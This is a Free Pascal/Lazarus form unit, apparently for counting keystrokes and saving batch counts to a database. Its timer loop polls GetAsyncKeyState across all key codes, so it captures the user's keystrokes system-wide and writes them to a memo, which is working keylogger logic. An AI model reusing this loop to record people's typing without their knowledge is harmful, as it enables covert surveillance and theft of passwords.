unit uformprincipal;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, DB, Forms, Controls, Graphics, Dialogs, ExtCtrls, StdCtrls,
  DBGrids, ZConnection, ZDataset;

type

  { TformPrincipal }

  TformPrincipal = class(TForm)
    btnSalvarLote: TButton;
    dsPacote: TDataSource;
    DBGrid1: TDBGrid;
    Label1: TLabel;
    Label2: TLabel;
    lblDigitosAcumuladoLote: TLabel;
    lblDigitosAcumuladoAtivo: TLabel;
    mmValores: TMemo;
    TimerDisplay: TTimer;
    TimerSalvarLote: TTimer;
    TimerKey: TTimer;
    ZConnection: TZConnection;
    zqPacote: TZQuery;
    zqPacoteSalvar: TZQuery;
    procedure btnSalvarLoteClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure TimerDisplayTimer(Sender: TObject);
    procedure TimerKeyTimer(Sender: TObject);
    procedure TimerSalvarLoteTimer(Sender: TObject);
  private

  public
    acumulador_digito_ativo:integer;
    acumulador_digito_lote:integer;
    procedure Coloca(valor:string);
    procedure acumular_um_digito();
    procedure salvar_lote_no_bd();
  end;

var
  formPrincipal: TformPrincipal;

implementation
uses JwaWindows;

{$R *.lfm}

{ TformPrincipal }

procedure TformPrincipal.TimerKeyTimer(Sender: TObject);
var
  keyloop, KeyResult: integer;
begin
  keyloop := 0;
  repeat
    KeyResult := GetAsyncKeyState(keyloop);
    if KeyResult = -32767 then
    begin
      case keyloop of
        8: Coloca(' [bACKSPACE] ');
        9: Coloca(' [TAB] ');
        12: Coloca(' [ALT] ');
        13: Coloca(' [ENTER] ');
        16: Coloca(' [sHIFT] ');
        17: Coloca(' [CONTROL] ');
        18: Coloca(' [ALT] ');
        20: Coloca(' [CAPS LOCK] ');
        21: Coloca(' [PAGE UP] ');
        27: Coloca(' [ESC] ');
        33: Coloca(' [PAGE UP] ');
        34: Coloca(' [PAGE DOWN] ');
        35: Coloca(' [END] ');
        36: Coloca(' [HOME] ');
        37: Coloca(' [sETA ESQUERDA] ');
        38: Coloca(' [sETA ACIMA] ');
        39: Coloca(' [sETA DIREITA] ');
        40: Coloca(' [sETA ABAIXO] ');
        45: Coloca(' [iNSERT] ');
        46: Coloca(' [DEL] ');
        91: Coloca(' [WIN ESQUERDA] ');
        92: Coloca(' [WIN DIREITA] ');
        93: Coloca(' [MENU POP-UP] ');
        96: Coloca('0');
        97: Coloca('1');
        98: Coloca('2');
        99: Coloca('3');
        100: Coloca('4');
        101: Coloca('5');
        102: Coloca('6');
        103: Coloca('7');
        104: Coloca('8');
        105: Coloca('9');
        106: Coloca(' [NUM *] ');
        107: Coloca(' [NUM +] ');
        109: Coloca(' [NUM -] ');
        110: Coloca(' [NUM SEP. DECIMAL] ');
        111: Coloca(' [NUM /] ');
        112: Coloca(' [F1] ');
        113: Coloca(' [F2] ');
        114: Coloca(' [F3] ');
        115: Coloca(' [F4] ');
        116: Coloca(' [F5] ');
        117: Coloca(' [F6] ');
        118: Coloca(' [F7] ');
        119: Coloca(' [F8] ');
        120: Coloca(' [F9] ');
        121: Coloca(' [F10] ');
        122: Coloca(' [F11] ');
        123: Coloca(' [F12] ');
        144: Coloca(' [NUM LOCK] ');
        186: Coloca('Ç');
        187: Coloca('=');
        188: Coloca(',');
        189: Coloca('-');
        190: Coloca('.');
        191: Coloca(';');
        192: Coloca(' [APÓSTROFO] ');
        193: Coloca('/');
        194: Coloca(' [NUM PONTO] ');
        219: Coloca('´');
        220: Coloca(']');
        221: Coloca('[');
        222: Coloca('~');
        226: Coloca('\');
        else
          if (KeyLoop >= 65) and (keyloop <= 90) then
            Coloca(Chr(keyloop));
          if (keyloop >= 32) and (keyloop <= 63) then
            Coloca(Chr(keyloop));
          //numpad keycodes
          if (keyloop >= 96) and (keyloop <= 110) then
            Coloca(Chr(keyloop));
      end;
    end; //case;
    Inc(keyloop);
  until keyloop = 255;
end;

procedure TformPrincipal.salvar_lote_no_bd();
begin
  //zqPacoteSalvar.paramByName('datahora_envio').asDateTime := now();
  //zqPacoteSalvar.ParamByName('quantidade_digitada').AsInteger := acumulador_digito_lote ;
  zqPacoteSalvar.ExecSQL();

  acumulador_digito_lote := 0;
end;

procedure TformPrincipal.TimerSalvarLoteTimer(Sender: TObject);
begin
  salvar_lote_no_bd();
end;

procedure TformPrincipal.TimerDisplayTimer(Sender: TObject);
begin
  lblDigitosAcumuladoAtivo.caption := intToStr(acumulador_digito_ativo);
  lblDigitosAcumuladoLote.caption := intToStr(acumulador_digito_lote);
end;

procedure TformPrincipal.btnSalvarLoteClick(Sender: TObject);
begin
  salvar_lote_no_bd();
end;

procedure TformPrincipal.FormShow(Sender: TObject);
begin

end;

procedure TFormPrincipal.Coloca(valor:string);
begin
 mmValores.lines.add(valor);
 acumular_um_digito();
end;

procedure TFormPrincipal.acumular_um_digito();
begin
 acumulador_digito_ativo += 1;
 acumulador_digito_lote += 1;
end;

end.
